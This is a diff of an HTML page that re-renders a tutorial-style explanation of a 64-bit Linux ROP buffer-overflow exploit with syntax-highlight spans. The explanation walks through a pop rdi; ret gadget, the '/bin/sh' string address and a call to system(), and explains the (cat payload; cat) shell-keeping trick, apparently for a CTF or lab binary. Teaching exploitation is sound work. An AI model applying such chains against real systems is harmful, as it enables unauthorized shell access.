-In 64-bit Linux, if you want to run a command like system(&quot;/bin/sh&quot;), you can't just put the argument on the stack. The CPU looks for the first argument in a specific &quot;register&quot; (a tiny, ultra-fast storage slot inside the CPU) called RDI.
+<span class="n">In</span><span class="w"> </span><span class="mi">64</span><span class="o">-</span><span class="n">bit</span><span class="w"> </span><span class="n">Linux</span><span class="p">,</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">want</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">command</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">),</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">can</span><span class="s1">&#39;t just put the argument on the stack. The CPU looks for the first argument in a specific &quot;register&quot; (a tiny, ultra-fast storage slot inside the CPU) called RDI.</span>
 
-    pop rdi: This instruction tells the CPU: &quot;Take the very next value on the stack and put it into the RDI register.&quot;
+<span class="w">    </span><span class="n">pop</span><span class="w"> </span><span class="n">rdi</span><span class="p">:</span><span class="w"> </span><span class="n">This</span><span class="w"> </span><span class="n">instruction</span><span class="w"> </span><span class="n">tells</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">CPU</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Take the very next value on the stack and put it into the RDI register.&quot;</span>
 
-    ret: This tells the CPU: &quot;Now look at the next value on the stack and jump there.&quot;
+<span class="w">    </span><span class="n">ret</span><span class="p">:</span><span class="w"> </span><span class="n">This</span><span class="w"> </span><span class="n">tells</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">CPU</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Now look at the next value on the stack and jump there.&quot;</span>
 
-By using the address 0x400803, we aren't running a function; we are using a tiny &quot;snippet&quot; of existing code to set up our attack.
-3. The ROP Chain Execution
+<span class="n">By</span><span class="w"> </span><span class="n">using</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">address</span><span class="w"> </span><span class="mh">0x400803</span><span class="p">,</span><span class="w"> </span><span class="n">we</span><span class="w"> </span><span class="n">aren</span><span class="s1">&#39;t running a function; we are using a tiny &quot;snippet&quot; of existing code to set up our attack.</span>
+<span class="mf">3.</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">ROP</span><span class="w"> </span><span class="n">Chain</span><span class="w"> </span><span class="n">Execution</span>
 
-Think of the ROP (Return-Oriented Programming) chain like a series of dominoes. Once the first one falls (the overflow), the rest follow automatically:
-Step    Address Action  Result
-1   0x400803    Jumps to pop rdi; ret   CPU starts executing our instructions.
-2   0x400840    Popped into RDI The CPU now holds the string &quot;/bin/sh&quot; in its argument slot.
-3   0x4006be    Jumps to system()   The CPU runs system(RDI), which is system(&quot;/bin/sh&quot;).
-4. Why (cat payload; cat)?
+<span class="n">Think</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">ROP</span><span class="w"> </span><span class="p">(</span><span class="n">Return</span><span class="o">-</span><span class="n">Oriented</span><span class="w"> </span><span class="n">Programming</span><span class="p">)</span><span class="w"> </span><span class="n">chain</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">series</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">dominoes</span><span class="o">.</span><span class="w"> </span><span class="n">Once</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">first</span><span class="w"> </span><span class="n">one</span><span class="w"> </span><span class="n">falls</span><span class="w"> </span><span class="p">(</span><span class="n">the</span><span class="w"> </span><span class="n">overflow</span><span class="p">),</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">rest</span><span class="w"> </span><span class="n">follow</span><span class="w"> </span><span class="n">automatically</span><span class="p">:</span>
+<span class="n">Step</span><span class="w">    </span><span class="n">Address</span><span class="w"> </span><span class="n">Action</span><span class="w">  </span><span class="n">Result</span>
+<span class="mi">1</span><span class="w">   </span><span class="mh">0x400803</span><span class="w">    </span><span class="n">Jumps</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">pop</span><span class="w"> </span><span class="n">rdi</span><span class="p">;</span><span class="w"> </span><span class="n">ret</span><span class="w">   </span><span class="n">CPU</span><span class="w"> </span><span class="n">starts</span><span class="w"> </span><span class="n">executing</span><span class="w"> </span><span class="n">our</span><span class="w"> </span><span class="n">instructions</span><span class="o">.</span>
+<span class="mi">2</span><span class="w">   </span><span class="mh">0x400840</span><span class="w">    </span><span class="n">Popped</span><span class="w"> </span><span class="n">into</span><span class="w"> </span><span class="n">RDI</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">CPU</span><span class="w"> </span><span class="n">now</span><span class="w"> </span><span class="n">holds</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">string</span><span class="w"> </span><span class="s2">&quot;/bin/sh&quot;</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">its</span><span class="w"> </span><span class="n">argument</span><span class="w"> </span><span class="n">slot</span><span class="o">.</span>
+<span class="mi">3</span><span class="w">   </span><span class="mh">0x4006be</span><span class="w">    </span><span class="n">Jumps</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">system</span><span class="p">()</span><span class="w">   </span><span class="n">The</span><span class="w"> </span><span class="n">CPU</span><span class="w"> </span><span class="n">runs</span><span class="w"> </span><span class="n">system</span><span class="p">(</span><span class="n">RDI</span><span class="p">),</span><span class="w"> </span><span class="n">which</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">)</span><span class="o">.</span>
+<span class="mf">4.</span><span class="w"> </span><span class="n">Why</span><span class="w"> </span><span class="p">(</span><span class="n">cat</span><span class="w"> </span><span class="n">payload</span><span class="p">;</span><span class="w"> </span><span class="n">cat</span><span class="p">)</span><span class="err">?</span>
 
-This is a clever trick for interacting with shells.
+<span class="n">This</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">clever</span><span class="w"> </span><span class="n">trick</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">interacting</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">shells</span><span class="o">.</span>
 
-    The first cat sends the &quot;exploit&quot; to the program.
+<span class="w">    </span><span class="n">The</span><span class="w"> </span><span class="n">first</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">sends</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="s2">&quot;exploit&quot;</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">program</span><span class="o">.</span>
 
-    The second cat keeps your keyboard connected to the program.
+<span class="w">    </span><span class="n">The</span><span class="w"> </span><span class="n">second</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="n">keeps</span><span class="w"> </span><span class="n">your</span><span class="w"> </span><span class="n">keyboard</span><span class="w"> </span><span class="n">connected</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">program</span><span class="o">.</span>
 
-    Without that second cat, the shell would open, see that there is no more input coming, and immediately close.
-</code></pre>
+<span class="w">    </span><span class="n">Without</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">second</span><span class="w"> </span><span class="n">cat</span><span class="p">,</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">shell</span><span class="w"> </span><span class="n">would</span><span class="w"> </span><span class="n">open</span><span class="p">,</span><span class="w"> </span><span class="n">see</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">there</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">no</span><span class="w"> </span><span class="n">more</span><span class="w"> </span><span class="n">input</span><span class="w"> </span><span class="n">coming</span><span class="p">,</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">immediately</span><span class="w"> </span><span class="n">close</span><span class="o">.</span>
+</code></pre></div>
         </div>
     </main>
 
